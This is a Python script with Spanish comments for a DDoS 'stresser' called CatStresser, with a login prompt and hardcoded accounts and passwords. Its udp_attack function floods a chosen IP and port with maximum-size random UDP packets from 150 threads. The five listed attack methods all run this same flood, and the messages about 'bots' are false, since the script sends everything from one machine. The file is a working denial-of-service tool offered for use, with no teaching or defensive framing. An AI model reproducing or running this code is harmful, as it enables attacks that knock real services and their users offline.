import os
import socket
import threading
import random
import time
import sys

# Colores ANSI
BLUE = '\033[94m'
WHITE = '\033[97m'
GRAY = '\033[90m'
RESET = '\033[0m'

# Configuración de cuentas
accounts = {
    "apsx": {"password": "apsxnew", "bots": 57, "bytes": 65507},
    "asky": {"password": "asky", "bots": 30, "bytes": 65507}
}

# Arte ASCII después del inicio de sesión
ascii_art = f"""{BLUE}
("-''-/").___..--''"-._
 6_ 6 ) -. ( ).-.__.)
 (_Y_.)' ._ ) ._ . `-..-'
   _..--'_..-_/ /--'_.'
  ((((.-'' ((((.' (((.-'
{RESET}
Type 'help' for commands
"""

# Función para limpiar la pantalla
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Función para establecer el título de la ventana
def set_title(username, bots, running):
    title = f"CatStresser | user: {username} | bots: {bots} | Runnings: {running}"
    if os.name == 'nt':
        os.system(f"title {title}")
    else:
        print(f"\33]0;{title}\a", end='', flush=True)

# Función para realizar el ataque UDP
def udp_attack(ip, port, duration, packet_size):
    timeout = time.time() + duration
    message = random._urandom(packet_size)

    def send():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BUSY_POLL, 50)
                sock.sendto(message, (ip, port))
                sock.close()
            except Exception:
                pass

    threads = []
    for _ in range(150):  # 150 hilos
        t = threading.Thread(target=send)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Función principal
def main():
    clear()
    while True:
        username = input("username: ").strip()
        password = input("password: ").strip()

        if username in accounts and accounts[username]["password"] == password:
            break
        else:
            print("Login failed. Please try again.")

    clear()
    bots = accounts[username]["bots"]
    packet_size = accounts[username]["bytes"]
    running_attacks = 0
    print(ascii_art)
    set_title(username, bots, running_attacks)

    while True:
        try:
            cmd = input(f"{BLUE}CatStresser {WHITE}${RESET} ").strip()

            if cmd == "help":
                print("bots\nmethods")
            elif cmd == "bots":
                print(f"{username} has {bots} bots")
            elif cmd == "methods":
                print(".udphex <ip> <port> <time>")
                print(".udpraw <ip> <port> <time>")
                print(".tcpbypass <ip> <port> <time>")
                print(".udpbypass <ip> <port> <time>")
                print(".tcproxies <ip> <port> <time>")
            elif cmd.startswith("."):
                parts = cmd.split()
                if len(parts) != 4:
                    print("Usage: <method> <ip> <port> <time>")
                    continue

                method, ip, port_str, time_str = parts
                if method not in [".udphex", ".udpraw", ".tcpbypass", ".udpbypass", ".tcproxies"]:
                    print("Invalid method. Type 'methods' to see available.")
                    continue

                try:
                    port = int(port_str)
                    duration = int(time_str)
                except ValueError:
                    print("Invalid port or time.")
                    continue

                running_attacks += 1
                bots -= 1
                set_title(username, bots, running_attacks)

                print(f"{GRAY}> {WHITE}Method {GRAY}:{WHITE} {method[1:]}")
                print(f"{GRAY}> {WHITE}Target {GRAY}:{WHITE} {ip}")
                print(f"{GRAY}> {WHITE}Port {GRAY}:{WHITE} {port}")
                print(f"attack sent to {bots + 1} bots")

                # Ejecutar ataque
                udp_attack(ip, port, duration, packet_size)

                running_attacks -= 1
                bots += 1
                set_title(username, bots, running_attacks)

            else:
                print("Unknown command. Type 'help'.")
        except KeyboardInterrupt:
            print("\nNo puedes salirte del servidor.")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print("\nNo puedes salirte del servidor.")
        while True:
            time.sleep(1)
